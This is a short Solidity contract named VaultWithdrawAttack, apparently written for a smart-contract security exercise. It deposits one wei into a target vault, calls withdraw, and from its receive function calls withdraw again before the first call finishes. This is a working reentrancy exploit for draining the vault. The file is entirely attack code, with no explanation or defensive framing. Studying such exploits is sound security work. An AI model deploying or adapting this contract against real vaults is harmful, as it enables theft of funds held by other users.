pragma solidity ^0.7.6;


interface IVault {
    function withdraw(uint256 _amount) external;
     function deposit() external payable;
}


contract VaultWithdrawAttack {

    uint256 public flag; 
    address public victimAddress;



    receive() external payable{
    if(flag < 1){
       IVault(victimAddress).withdraw(1); 
       flag ++; 
    }
    }

    function setVictimAddress(address _victim) external returns(address ){
        victimAddress = _victim;
        return victimAddress;
    }

    function attack() external payable returns(bool){
        IVault(victimAddress).deposit{value: 1}();
        IVault(victimAddress).withdraw(1);
        return true;
    }

}